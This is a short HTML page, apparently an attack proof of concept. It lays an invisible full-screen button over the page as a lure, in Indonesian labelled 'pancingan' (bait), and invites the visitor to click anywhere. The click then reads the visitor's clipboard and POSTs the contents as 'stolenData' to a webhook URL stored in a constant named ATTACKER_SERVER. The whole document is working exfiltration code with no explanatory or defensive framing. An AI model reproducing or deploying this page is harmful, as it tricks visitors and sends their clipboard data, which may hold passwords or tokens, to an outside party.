<!DOCTYPE html>
<html>
<body style="height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center;">
    
    <button id="pancingan" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0;">
        Klik di sini
    </button>

    <div id="hasil">Silahkan klik di mana saja pada layar...</div>

    <script>
        const ATTACKER_SERVER = " https://webhooksite.net/74c3edfd-c9ba-464d-bd6a-da78b04562b6";

        document.getElementById('pancingan').addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('hasil').innerText = "Data terbaca: " + text;
                
                await fetch(ATTACKER_SERVER, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ stolenData: text })
                });
            } catch (err) {
                document.getElementById('hasil').innerText = "Error: " + err;
            }
        });
    </script>
</body>
</html>
